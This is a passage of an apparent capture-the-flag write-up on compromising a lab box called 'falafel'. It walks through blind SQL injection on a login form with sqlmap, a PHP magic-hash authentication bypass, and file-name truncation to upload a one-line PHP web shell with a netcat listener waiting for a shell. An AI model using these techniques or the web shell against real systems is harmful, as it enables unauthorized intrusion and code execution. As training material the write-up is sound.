* cyberlaw.txt looked like an interesting text page, which disclosed a user named `chris`.

**Initial Foothold**

SQL Injection

Since there wasn't anything else other than the login form, I captured the login POST via Burp and used it in `sqlmap`.

Sending different usernames in the login form returned different results -

Notice how entering `admin` as the username would show `Wrong identification` in the response, but using `test` would show `Try again..`.

By this it can be deduced that this login form is vulnerable to a boolean-based blind injection (the username= parameter).

So basically, "Wrong identification" = TRUE, "Try again.." = FALSE.

Effectively we can use `Wrong identification` to see if we're on the right track. All we're doing here is dumping credentials from `falafel` database.

PHP Type Juggling

Notice how the password for admin is hashed - it begins with 0e. We can try using magic tables to bypass the authentication and get into the account since 0 to exponent of 462 is still 0. Right here we'll be abusing PHP's Loose comparison weakness.

* Magic Hashes

For this we'll be using MD5 â€œMagic Number" (from https://www.whitehatsec.com/blog/magic-hashes/) 240610708 as the md5 hash for this string would also start with 0e. As a result this magic hash would collide with other hashes as both are treated as 0 and therefore would compare to be **true**

I successfully logged in by using `240610708` as the password for `admin`

At the start I tried to upload a .php file to see if we can get an easy php reverse shell.

From this image we can clearly see .php files won't work

**File Name Truncation**
What I did was create a file with 251 characters using `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 251`, add .png at the end of the file and upload it. 

![image](https://user-images.githubusercontent.com/88967140/178954298-a5a63f19-d81b-425c-8482-bba311b7e6a6.png)

Interestingly enough the output mentioned the file name being too long and shortening it, which turned out to be from 255 characters to 236

So now my idea was to make it so that the .png part gets cut off by the upload system and we're left off with <file>.php from which we can execute PHP code.
I used `vi` to insert this arbitrary PHP execution code in the file we're going to upload next:
 `<?php echo system($_REQUEST['leo']) ?>`
and set up `nc -lvnp 12345` on our other terminal
